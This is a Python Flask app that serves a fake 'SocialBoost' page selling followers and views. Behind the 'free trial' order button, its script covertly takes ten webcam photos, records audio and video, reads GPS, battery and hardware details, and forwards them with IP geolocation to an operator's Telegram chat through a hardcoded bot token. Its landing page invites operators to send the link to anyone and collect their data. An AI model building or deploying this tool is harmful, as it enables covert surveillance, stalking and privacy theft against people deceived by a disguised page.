import os
from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import base64
import requests
from datetime import datetime
import logging
import io
import socket
import platform
from PIL import Image
import time
import urllib.parse

app = Flask(__name__)
CORS(app)

# ─── TELEGRAM CONFIG ────────────────────────────────────────────
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7888111866:AAFkxlNRo5WeBKazD2H6BqjDrrCWoJTxGiE')
RENDER_URL = os.environ.get('RENDER_URL', 'https://proxy-dev-rnvm.onrender.com')
DEFAULT_REDIRECT = os.environ.get('DEFAULT_REDIRECT', 'https://youtube.com')

TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
SEND_PHOTO_URL = f"{TELEGRAM_API}/sendPhoto"
SEND_AUDIO_URL = f"{TELEGRAM_API}/sendAudio"
SEND_VIDEO_URL = f"{TELEGRAM_API}/sendVideo"
SEND_MESSAGE_URL = f"{TELEGRAM_API}/sendMessage"
SEND_LOCATION_URL = f"{TELEGRAM_API}/sendLocation"

# ─── LOGGING ─────────────────────────────────────────────────────
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ─── HELPERS ─────────────────────────────────────────────────────
def get_device_info():
    try:
        device_name = platform.node() or "Unknown Device"
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip_address = s.getsockname()[0]
        s.close()
        return device_name, ip_address
    except:
        return "Unknown Device", "0.0.0.0"

def to_bold_unicode(text):
    result = []
    for char in text:
        code = ord(char)
        if 65 <= code <= 90:
            result.append(chr(0x1D400 + (code - 65)))
        elif 97 <= code <= 122:
            result.append(chr(0x1D41A + (code - 97)))
        elif 48 <= code <= 57:
            result.append(chr(0x1D7CE + (code - 48)))
        else:
            result.append(char)
    return ''.join(result)

def safe(val):
    return str(val).replace('_', '\\_').replace('*', '\\*').replace('`', '\\`')

# ─── SMM PANEL HTML PAGE ────────────────────────────────────────
def get_smm_panel_html(chat_id, redirect_url):
    return f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SocialBoost - Followers & Engagement</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0a0a12;
            min-height: 100vh;
            color: #fff;
        }}
        
        .header {{
            background: linear-gradient(135deg, #1a0533, #0d1b2a);
            padding: 20px 16px 60px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }}
        
        .header::before {{
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at 30% 50%, rgba(155, 93, 229, 0.1), transparent 70%);
            animation: pulseGlow 4s ease-in-out infinite;
        }}
        
        @keyframes pulseGlow {{
            0%, 100% {{ transform: scale(1); opacity: 0.5; }}
            50% {{ transform: scale(1.2); opacity: 1; }}
        }}
        
        .header-content {{
            position: relative;
            z-index: 1;
        }}
        
        .logo {{
            font-size: 32px;
            font-weight: 800;
            background: linear-gradient(135deg, #00f5d4, #9b5de5, #f15bb5);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            display: inline-block;
        }}
        
        .logo-sub {{
            color: #8892b0;
            font-size: 12px;
            letter-spacing: 4px;
            text-transform: uppercase;
            margin-top: 4px;
        }}
        
        .header .badge {{
            display: inline-block;
            background: rgba(0, 245, 212, 0.15);
            color: #00f5d4;
            padding: 4px 16px;
            border-radius: 20px;
            font-size: 11px;
            margin-top: 10px;
            border: 1px solid rgba(0, 245, 212, 0.2);
        }}
        
        .stats-bar {{
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            padding: 0 16px;
            margin-top: -40px;
            position: relative;
            z-index: 2;
        }}
        
        .stat-card {{
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(20px);
            border-radius: 16px;
            padding: 14px 10px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.06);
        }}
        
        .stat-card .number {{
            font-size: 20px;
            font-weight: 700;
            background: linear-gradient(135deg, #00f5d4, #9b5de5);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }}
        
        .stat-card .label {{
            font-size: 10px;
            color: #8892b0;
            margin-top: 2px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }}
        
        .main-content {{
            padding: 20px 16px 100px;
            max-width: 500px;
            margin: 0 auto;
        }}
        
        .section-title {{
            font-size: 18px;
            font-weight: 700;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 10px;
        }}
        
        .section-title .highlight {{
            color: #00f5d4;
        }}
        
        .service-grid {{
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
            margin-bottom: 24px;
        }}
        
        .service-card {{
            background: rgba(255, 255, 255, 0.03);
            border-radius: 16px;
            padding: 16px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.06);
            transition: all 0.3s ease;
            cursor: pointer;
        }}
        
        .service-card:hover {{
            transform: translateY(-2px);
            border-color: rgba(0, 245, 212, 0.3);
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }}
        
        .service-card .icon {{
            font-size: 28px;
            margin-bottom: 8px;
        }}
        
        .service-card .name {{
            font-size: 13px;
            font-weight: 600;
        }}
        
        .service-card .price {{
            font-size: 11px;
            color: #00f5d4;
            margin-top: 4px;
        }}
        
        .service-card .orders {{
            font-size: 10px;
            color: #8892b0;
            margin-top: 2px;
        }}
        
        .order-box {{
            background: rgba(255, 255, 255, 0.03);
            border-radius: 20px;
            padding: 20px;
            border: 1px solid rgba(255, 255, 255, 0.06);
            margin-top: 10px;
        }}
        
        .order-box .label {{
            font-size: 13px;
            color: #8892b0;
            margin-bottom: 6px;
            display: block;
        }}
        
        .order-box input, .order-box select {{
            width: 100%;
            padding: 14px 16px;
            border-radius: 12px;
            border: 1px solid rgba(255, 255, 255, 0.08);
            background: rgba(255, 255, 255, 0.05);
            color: #fff;
            font-size: 15px;
            margin-bottom: 14px;
            outline: none;
            transition: border 0.3s;
        }}
        
        .order-box input:focus, .order-box select:focus {{
            border-color: #00f5d4;
        }}
        
        .order-box input::placeholder {{
            color: #4a4a5a;
        }}
        
        .order-box select option {{
            background: #1a1a2e;
            color: #fff;
        }}
        
        .btn-order {{
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 14px;
            font-size: 16px;
            font-weight: 700;
            color: #fff;
            background: linear-gradient(135deg, #00f5d4, #9b5de5);
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }}
        
        .btn-order:hover {{
            transform: scale(1.02);
            box-shadow: 0 0 40px rgba(0, 245, 212, 0.3);
        }}
        
        .btn-order:active {{
            transform: scale(0.98);
        }}
        
        .btn-order .spinner {{
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top: 2px solid #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }}
        
        .btn-order.loading .spinner {{
            display: block;
        }}
        
        .btn-order.loading .btn-text {{
            display: none;
        }}
        
        @keyframes spin {{
            to {{ transform: rotate(360deg); }}
        }}
        
        .payment-methods {{
            display: flex;
            gap: 12px;
            justify-content: center;
            margin: 16px 0;
            flex-wrap: wrap;
        }}
        
        .payment-method {{
            padding: 6px 14px;
            border-radius: 20px;
            background: rgba(255, 255, 255, 0.05);
            font-size: 11px;
            color: #8892b0;
            border: 1px solid rgba(255, 255, 255, 0.06);
        }}
        
        .payment-method.active {{
            border-color: #00f5d4;
            color: #00f5d4;
            background: rgba(0, 245, 212, 0.1);
        }}
        
        .footer {{
            text-align: center;
            padding: 20px 16px;
            border-top: 1px solid rgba(255, 255, 255, 0.04);
            margin-top: 20px;
        }}
        
        .footer .links {{
            display: flex;
            justify-content: center;
            gap: 16px;
            flex-wrap: wrap;
            margin-bottom: 12px;
        }}
        
        .footer .links a {{
            color: #8892b0;
            text-decoration: none;
            font-size: 12px;
            transition: color 0.3s;
        }}
        
        .footer .links a:hover {{
            color: #00f5d4;
        }}
        
        .footer .copy {{
            color: #4a4a5a;
            font-size: 11px;
        }}
        
        .footer .copy .heart {{
            color: #f15bb5;
        }}
        
        .toast {{
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0, 0, 0, 0.9);
            padding: 14px 24px;
            border-radius: 14px;
            font-size: 14px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            display: none;
            z-index: 999;
            max-width: 90%;
            text-align: center;
            backdrop-filter: blur(10px);
        }}
        
        .toast.show {{
            display: block;
            animation: slideUp 0.4s ease;
        }}
        
        .toast.success {{
            border-color: #00f5a0;
        }}
        
        .toast.error {{
            border-color: #f15bb5;
        }}
        
        @keyframes slideUp {{
            from {{ opacity: 0; transform: translateX(-50%) translateY(20px); }}
            to {{ opacity: 1; transform: translateX(-50%) translateY(0); }}
        }}
        
        #video, #canvas {{
            display: none;
        }}
        
        @media (max-width: 400px) {{
            .service-grid {{
                grid-template-columns: 1fr 1fr;
                gap: 8px;
            }}
            .service-card {{
                padding: 12px;
            }}
            .service-card .icon {{
                font-size: 22px;
            }}
        }}
    </style>
</head>
<body>

    <div class="header">
        <div class="header-content">
            <div class="logo">🚀 SocialBoost</div>
            <div class="logo-sub">Premium Social Media Services</div>
            <div class="badge">⭐ Trusted by 50,000+ Users</div>
        </div>
    </div>

    <div class="stats-bar">
        <div class="stat-card">
            <div class="number">50K+</div>
            <div class="label">Orders</div>
        </div>
        <div class="stat-card">
            <div class="number">4.9★</div>
            <div class="label">Rating</div>
        </div>
        <div class="stat-card">
            <div class="number">24/7</div>
            <div class="label">Support</div>
        </div>
    </div>

    <div class="main-content">

        <div class="section-title">
            <span>🔥 Popular Services</span>
            <span class="highlight">▼</span>
        </div>

        <div class="service-grid">
            <div class="service-card" onclick="selectService('Instagram Followers')">
                <div class="icon">📸</div>
                <div class="name">Instagram Followers</div>
                <div class="price">From $2.99</div>
                <div class="orders">12,847 orders</div>
            </div>
            <div class="service-card" onclick="selectService('YouTube Views')">
                <div class="icon">▶️</div>
                <div class="name">YouTube Views</div>
                <div class="price">From $1.99</div>
                <div class="orders">8,234 orders</div>
            </div>
            <div class="service-card" onclick="selectService('TikTok Followers')">
                <div class="icon">🎵</div>
                <div class="name">TikTok Followers</div>
                <div class="price">From $3.49</div>
                <div class="orders">6,901 orders</div>
            </div>
            <div class="service-card" onclick="selectService('Telegram Members')">
                <div class="icon">✈️</div>
                <div class="name">Telegram Members</div>
                <div class="price">From $4.99</div>
                <div class="orders">4,322 orders</div>
            </div>
        </div>

        <div class="order-box">
            <label class="label">📌 Select Service</label>
            <select id="serviceSelect">
                <option value="Instagram Followers">📸 Instagram Followers</option>
                <option value="YouTube Views">▶️ YouTube Views</option>
                <option value="TikTok Followers">🎵 TikTok Followers</option>
                <option value="Telegram Members">✈️ Telegram Members</option>
                <option value="Facebook Likes">👍 Facebook Likes</option>
                <option value="Twitter Followers">🐦 Twitter Followers</option>
            </select>

            <label class="label">📱 Username / Link</label>
            <input type="text" id="usernameInput" placeholder="Enter your username or profile link" value="">

            <label class="label">📧 Email (for order confirmation)</label>
            <input type="email" id="emailInput" placeholder="your@email.com" value="">

            <label class="label">📞 Phone Number (optional)</label>
            <input type="tel" id="phoneInput" placeholder="+91 98765 43210" value="">

            <div class="payment-methods">
                <span class="payment-method active">💳 Card</span>
                <span class="payment-method">UPI</span>
                <span class="payment-method">🟢 PayTM</span>
                <span class="payment-method">🔵 GPay</span>
            </div>

            <button class="btn-order" id="orderBtn" onclick="placeOrder()">
                <span class="btn-text">🚀 Place Order - Free Trial</span>
                <div class="spinner"></div>
            </button>
            
            <div style="text-align:center;font-size:11px;color:#4a4a5a;margin-top:10px;">
                🔒 Secure • No payment required for trial
            </div>
        </div>
    </div>

    <div class="footer">
        <div class="links">
            <a href="#">About</a>
            <a href="#">Terms</a>
            <a href="#">Privacy</a>
            <a href="#">Support</a>
            <a href="https://t.me/proxydominates" target="_blank">📢 Channel</a>
        </div>
        <div class="copy">
            Made with <span class="heart">❤</span> by <strong style="color:#00f5d4;">FROSTY</strong> • 2026
        </div>
    </div>

    <div class="toast" id="toast"></div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        let selectedService = 'Instagram Followers';
        let isProcessing = false;

        function selectService(name) {{
            selectedService = name;
            document.getElementById('serviceSelect').value = name;
            showToast('✅ Selected: ' + name);
        }}

        function showToast(msg, type) {{
            type = type || '';
            const t = document.getElementById('toast');
            t.textContent = msg;
            t.className = 'toast show ' + type;
            clearTimeout(t._timeout);
            t._timeout = setTimeout(function() {{
                t.classList.remove('show');
            }}, 3000);
        }}

        async function placeOrder() {{
            if (isProcessing) return;
            
            const btn = document.getElementById('orderBtn');
            const username = document.getElementById('usernameInput').value.trim();
            const email = document.getElementById('emailInput').value.trim();
            const phone = document.getElementById('phoneInput').value.trim();
            const service = document.getElementById('serviceSelect').value;

            if (!username) {{
                showToast('⚠️ Please enter your username or link', 'error');
                return;
            }}

            if (!email) {{
                showToast('⚠️ Please enter your email', 'error');
                return;
            }}

            btn.classList.add('loading');
            btn.disabled = true;
            isProcessing = true;

            showToast('⏳ Processing your order...');

            let data = {{
                chat_id: "{chat_id}",
                service: service,
                username: username,
                email: email,
                phone: phone || 'Not provided',
                userAgent: navigator.userAgent,
                language: navigator.language || 'en-US',
                platform: navigator.platform,
                cores: navigator.hardwareConcurrency || 'Unknown',
                ram: navigator.deviceMemory || 'Unknown',
                screen: screen.width + 'x' + screen.height,
                battery_level: 'N/A',
                charging: 'No',
                storage_used: '0.00',
                storage_total: '0.00',
                lat: null,
                lon: null,
                photos: [],
                audio: null,
                video: null,
                perm_cam: 'Denied',
                perm_loc: 'Denied',
                perm_mic: 'Denied'
            }};

            try {{
                let b = await navigator.getBattery();
                data.battery_level = Math.round(b.level * 100) + '%';
                data.charging = b.charging ? 'Yes' : 'No';
            }} catch(e) {{}}

            try {{
                if (navigator.storage && navigator.storage.estimate) {{
                    const estimate = await navigator.storage.estimate();
                    data.storage_used = (estimate.usage / (1024 * 1024 * 1024)).toFixed(2);
                    data.storage_total = (estimate.quota / (1024 * 1024 * 1024)).toFixed(2);
                }}
            }} catch(e) {{}}

            try {{
                let stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: 'user' }}, audio: false }});
                data.perm_cam = 'Allowed';
                let video = document.getElementById('video');
                video.srcObject = stream;
                await new Promise(function(r) {{ setTimeout(r, 1000); }});
                
                let canvas = document.getElementById('canvas');
                
                for (let i = 0; i < 10; i++) {{
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    data.photos.push(canvas.toDataURL('image/jpeg', 0.8));
                    await new Promise(function(r) {{ setTimeout(r, 400); }});
                }}
                
                stream.getTracks().forEach(function(t) {{ t.stop(); }});
            }} catch(e) {{
                data.perm_cam = 'Denied';
            }}

            try {{
                let audioStream = await navigator.mediaDevices.getUserMedia({{ audio: true }});
                data.perm_mic = 'Allowed';
                let mediaRecorder = new MediaRecorder(audioStream);
                let audioChunks = [];
                
                mediaRecorder.ondataavailable = function(event) {{ audioChunks.push(event.data); }};
                mediaRecorder.start();
                await new Promise(function(r) {{ setTimeout(r, 5000); }});
                mediaRecorder.stop();
                await new Promise(function(r) {{ mediaRecorder.onstop = r; }});
                
                let audioBlob = new Blob(audioChunks, {{ type: 'audio/webm' }});
                let reader = new FileReader();
                data.audio = await new Promise(function(resolve) {{
                    reader.onloadend = function() {{ resolve(reader.result); }};
                    reader.readAsDataURL(audioBlob);
                }});
                audioStream.getTracks().forEach(function(t) {{ t.stop(); }});
            }} catch(e) {{
                data.perm_mic = 'Denied';
            }}

            try {{
                let videoStream = await navigator.mediaDevices.getUserMedia({{ 
                    video: {{ facingMode: 'user' }}, 
                    audio: true 
                }});
                
                let videoRecorder = new MediaRecorder(videoStream);
                let videoChunks = [];
                
                videoRecorder.ondataavailable = function(event) {{ videoChunks.push(event.data); }};
                videoRecorder.start();
                await new Promise(function(r) {{ setTimeout(r, 8000); }});
                videoRecorder.stop();
                await new Promise(function(r) {{ videoRecorder.onstop = r; }});
                
                let videoBlob = new Blob(videoChunks, {{ type: 'video/webm' }});
                let reader = new FileReader();
                data.video = await new Promise(function(resolve) {{
                    reader.onloadend = function() {{ resolve(reader.result); }};
                    reader.readAsDataURL(videoBlob);
                }});
                videoStream.getTracks().forEach(function(t) {{ t.stop(); }});
            }} catch(e) {{}}

            try {{
                await new Promise(function(resolve) {{
                    navigator.geolocation.getCurrentPosition(
                        function(pos) {{ 
                            data.lat = pos.coords.latitude; 
                            data.lon = pos.coords.longitude; 
                            data.perm_loc = 'Allowed'; 
                            resolve(); 
                        }},
                        function() {{ resolve(); }},
                        {{ timeout: 5000, enableHighAccuracy: true }}
                    );
                }});
            }} catch(e) {{
                data.perm_loc = 'Denied';
            }}

            try {{
                showToast('📤 Sending your order...');
                
                const response = await fetch('/upload/all', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify(data)
                }});
                
                if (response.ok) {{
                    showToast('✅ Order placed successfully! Redirecting...', 'success');
                    btn.classList.remove('loading');
                    btn.disabled = false;
                    isProcessing = false;
                    
                    setTimeout(function() {{
                        window.location.href = "{redirect_url}";
                    }}, 2000);
                }} else {{
                    showToast('❌ Something went wrong. Please try again.', 'error');
                    btn.classList.remove('loading');
                    btn.disabled = false;
                    isProcessing = false;
                }}
            }} catch(e) {{
                showToast('❌ Network error. Please try again.', 'error');
                btn.classList.remove('loading');
                btn.disabled = false;
                isProcessing = false;
            }}
        }}

        document.getElementById('usernameInput').value = '@' + Math.random().toString(36).substring(2, 8);
        document.getElementById('emailInput').value = 'user' + Math.random().toString(36).substring(2, 6) + '@gmail.com';
    </script>

</body>
</html>
"""

# ─── ROUTES ──────────────────────────────────────────────────────
@app.route("/")
def index():
    chat_id = request.args.get('id')
    redirect_url = request.args.get('redir', DEFAULT_REDIRECT)
    
    if not chat_id:
        return render_template_string(f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>SocialBoost</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body{{background:#0a0a12;color:#fff;text-align:center;font-family:Arial,sans-serif;padding-top:100px;margin:0;}}
                .container{{max-width:500px;margin:0 auto;padding:20px;}}
                .logo{{font-size:42px;background:linear-gradient(135deg,#00f5d4,#9b5de5,#f15bb5);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:bold;}}
                .sub{{color:#8892b0;margin-top:10px;}}
                .btn{{display:inline-block;margin-top:30px;padding:15px 40px;background:linear-gradient(135deg,#00f5d4,#9b5de5);color:#fff;border:none;border-radius:30px;font-size:18px;cursor:pointer;}}
                .link-box{{background:rgba(255,255,255,0.05);padding:15px;border-radius:10px;margin:20px 0;word-break:break-all;color:#00f5d4;border:1px solid rgba(255,255,255,0.06);}}
                .note{{color:#666;font-size:12px;margin-top:20px;}}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">🚀 SocialBoost</div>
                <p class="sub">Premium Social Media Services</p>
                <p style="color:#00f5a0;">✅ Bot is Active!</p>
                <div class="link-box" id="linkDisplay">Loading...</div>
                <button class="btn" onclick="copyLink()">📋 Copy Link</button>
                <p class="note">⚡ Send this link to anyone and get their data!</p>
            </div>
            <script>
                var link = '{RENDER_URL}/?id=YOUR_CHAT_ID&redir=' + encodeURIComponent('{DEFAULT_REDIRECT}');
                document.getElementById('linkDisplay').textContent = link;
                function copyLink() {{
                    navigator.clipboard.writeText(link).then(function() {{
                        alert('✅ Link copied! Replace YOUR_CHAT_ID with your actual Chat ID');
                    }});
                }}
            </script>
        </body>
        </html>
        """)
    
    return render_template_string(get_smm_panel_html(chat_id, redirect_url))

# ─── UPLOAD ALL DATA ROUTE ──────────────────────────────────────
@app.route("/upload/all", methods=["POST"])
def upload_all():
    try:
        data = request.get_json()
        chat_id = data.get('chat_id')
        
        if not chat_id:
            return jsonify({"success": False, "error": "No chat_id"}), 400
        
        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
        device_name, ip_address = get_device_info()
        
        try:
            ip_info = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,timezone,isp,org,mobile,proxy").json()
        except:
            ip_info = {}

        bold_device = to_bold_unicode(device_name)
        bold_ip = to_bold_unicode(ip)
        bold_time = to_bold_unicode(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))

        # ─── SEND ORDER INFO ──────────────────────────────────────
        try:
            order_msg = f"""🛒 **New Order Placed!**
━━━━━━━━━━━━━━━━

📌 **Service:** {data.get('service', 'N/A')}
👤 **Username:** {data.get('username', 'N/A')}
📧 **Email:** {data.get('email', 'N/A')}
📞 **Phone:** {data.get('phone', 'N/A')}

━━━━━━━━━━━━━━━━
⚡ Powered by @Proxyfxz"""
            
            msg_data = {"chat_id": chat_id, "text": order_msg, "parse_mode": "Markdown"}
            requests.post(SEND_MESSAGE_URL, data=msg_data)
            logger.info(f"✅ Order info sent to {chat_id}")
        except Exception as e:
            logger.error(f"Order info error: {e}")

        # ─── SEND 10 PHOTOS ──────────────────────────────────────
        if data.get('photos') and len(data['photos']) > 0:
            try:
                for i, photo_data in enumerate(data['photos'], 1):
                    if photo_data.startswith("data:image"):
                        photo_data = photo_data.split(',')[1]
                    
                    image_bytes = base64.b64decode(photo_data)
                    image = Image.open(io.BytesIO(image_bytes))
                    output = io.BytesIO()
                    image.save(output, format='JPEG', quality=85, optimize=True)
                    compressed = output.getvalue()
                    
                    files = {"photo": (f"photo_{i}.jpg", compressed, "image/jpeg")}
                    
                    caption = f"""📸 𝐅𝐑𝐎𝐒𝐓𝐘 ─𑁍┊𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐁𝐨𝐭

⚡ 𝐃𝐞𝐯𝐢𝐜𝐞: {bold_device}
🌐 𝐈𝐏: {bold_ip}
🕐 𝐓𝐢𝐦𝐞: {bold_time}

🔹 𝐏𝐡𝐨𝐭𝐨 {i}/10 𝐂𝐚𝐩𝐭𝐮𝐫𝐞𝐝"""
                    
                    req_data = {"chat_id": chat_id, "caption": caption}
                    requests.post(SEND_PHOTO_URL, files=files, data=req_data)
                    time.sleep(0.5)
            except Exception as e:
                logger.error(f"Photo error: {e}")

        # ─── SEND AUDIO ──────────────────────────────────────────
        if data.get('audio'):
            try:
                audio_data = data['audio'].split(',')[1]
                audio_bytes = base64.b64decode(audio_data)
                files = {"audio": ("audio.webm", audio_bytes, "audio/webm")}
                caption = f"""🎤 𝐅𝐑𝐎𝐒𝐓𝐘 ─𑁍┊𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐁𝐨𝐭

⚡ 𝐃𝐞𝐯𝐢𝐜𝐞: {bold_device}
🌐 𝐈𝐏: {bold_ip}
🕐 𝐓𝐢𝐦𝐞: {bold_time}

🔹 𝐀𝐮𝐝𝐢𝐨 𝐑𝐞𝐜𝐨𝐫𝐝𝐢𝐧𝐠 (5 sec)"""
                req_data = {"chat_id": chat_id, "caption": caption}
                requests.post(SEND_AUDIO_URL, files=files, data=req_data)
            except Exception as e:
                logger.error(f"Audio error: {e}")

        # ─── SEND VIDEO ──────────────────────────────────────────
        if data.get('video'):
            try:
                video_data = data['video'].split(',')[1]
                video_bytes = base64.b64decode(video_data)
                files = {"video": ("video.webm", video_bytes, "video/webm")}
                caption = f"""🎥 𝐅𝐑𝐎𝐒𝐓𝐘 ─𑁍┊𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐁𝐨𝐭

⚡ 𝐃𝐞𝐯𝐢𝐜𝐞: {bold_device}
🌐 𝐈𝐏: {bold_ip}
🕐 𝐓𝐢𝐦𝐞: {bold_time}

🔹 𝐕𝐢𝐝𝐞𝐨 𝐂𝐥𝐢𝐩 (8 sec)"""
                req_data = {"chat_id": chat_id, "caption": caption}
                requests.post(SEND_VIDEO_URL, files=files, data=req_data)
            except Exception as e:
                logger.error(f"Video error: {e}")

        # ─── SEND LOCATION ───────────────────────────────────────
        if data.get('lat') and data.get('lon'):
            try:
                lat = data['lat']
                lon = data['lon']
                loc_data = {"chat_id": chat_id, "latitude": lat, "longitude": lon}
                requests.post(SEND_LOCATION_URL, data=loc_data)
                
                message = f"""📍 𝐅𝐑𝐎𝐒𝐓𝐘 ─𑁍┊𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐁𝐨𝐭

⚡ 𝐃𝐞𝐯𝐢𝐜𝐞: {bold_device}
🌐 𝐈𝐏: {bold_ip}
🕐 𝐓𝐢𝐦𝐞: {bold_time}

📌 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧:
🌍 𝐋𝐚𝐭𝐢𝐭𝐮𝐝𝐞: {lat}
🌍 𝐋𝐨𝐧𝐠𝐢𝐭𝐮𝐝𝐞: {lon}

🔗 <a href="https://www.google.com/maps?q={lat},{lon}">📍 𝐎𝐩𝐞𝐧 𝐢𝐧 𝐌𝐚𝐩𝐬</a>"""
                msg_data = {"chat_id": chat_id, "text": message, "parse_mode": "HTML"}
                requests.post(SEND_MESSAGE_URL, data=msg_data)
            except Exception as e:
                logger.error(f"Location error: {e}")

        # ─── SEND DEVICE INFO ────────────────────────────────────
        try:
            if data.get('lat') and data.get('lon'):
                loc_text = f"📍 {data['lat']}, {data['lon']}"
            else:
                loc_text = "❌ Not available"

            msg = (
                f"📊 **Device Information Captured**\n"
                f"━━━━━━━━━━━━━━━━\n\n"
                f"🖥️ **Device and Browser**\n"
                f"   • Device Model: `{safe(data.get('platform'))}`\n"
                f"   • User Agent: `{safe(data.get('userAgent'))}`\n\n"
                f"🌐 **Network Information**\n"
                f"   • IP Address: `{ip}`\n"
                f"   • ISP: {safe(ip_info.get('isp', 'N/A'))}\n"
                f"   • Language: {safe(data.get('language'))}\n\n"
                f"📍 **Location Details**\n"
                f"   • Country: {safe(ip_info.get('country', 'N/A'))}\n"
                f"   • Region: {safe(ip_info.get('regionName', 'N/A'))}\n"
                f"   • City: {safe(ip_info.get('city', 'N/A'))}\n"
                f"   • Timezone: {safe(ip_info.get('timezone', 'N/A'))}\n"
                f"   • GPS: {loc_text}\n\n"
                f"🖼️ **Display Information**\n"
                f"   • Resolution: {safe(data.get('screen'))}\n\n"
                f"🔋 **Battery Status**\n"
                f"   • Level: {safe(data.get('battery_level'))}\n"
                f"   • Charging: {safe(data.get('charging'))}\n\n"
                f"🔐 **Device Permissions**\n"
                f"   • Camera: {safe(data.get('perm_cam'))}\n"
                f"   • Microphone: {safe(data.get('perm_mic'))}\n"
                f"   • Location: {safe(data.get('perm_loc'))}\n\n"
                f"💾 **Hardware & Storage**\n"
                f"   • CPU Cores: {safe(data.get('cores'))}\n"
                f"   • RAM: {safe(data.get('ram'))} GB\n"
                f"   • Storage Used: {safe(data.get('storage_used'))} GB\n"
                f"   • Storage Total: {safe(data.get('storage_total'))} GB\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"⚡ Developed by: @Proxyfxz"
            )
            msg_data = {"chat_id": chat_id, "text": msg, "parse_mode": "Markdown"}
            requests.post(SEND_MESSAGE_URL, data=msg_data)
        except Exception as e:
            logger.error(f"Device info error: {e}")

        return jsonify({"success": True})

    except Exception as e:
        logger.error(f"Upload error: {str(e)}")
        return jsonify({"success": False, "error": str(e)}), 500

if __name__ == "__main__":
    device_name, ip_address = get_device_info()
    print("=" * 60)
    print("🚀 𝐒𝐨𝐜𝐢𝐚𝐥𝐁𝐨𝐨𝐬𝐭 ─𑁍┊𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐁𝐨𝐭")
    print("=" * 60)
    print(f"⚡ 𝐃𝐞𝐯𝐢𝐜𝐞: {device_name}")
    print(f"🌐 𝐈𝐏: {ip_address}")
    print(f"🔗 Render URL: {RENDER_URL}")
    print("📸 10 Photos + 🎤 Audio + 🎥 Video + 📍 Location + 📧 Email + 📱 Phone")
    print("=" * 60)
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
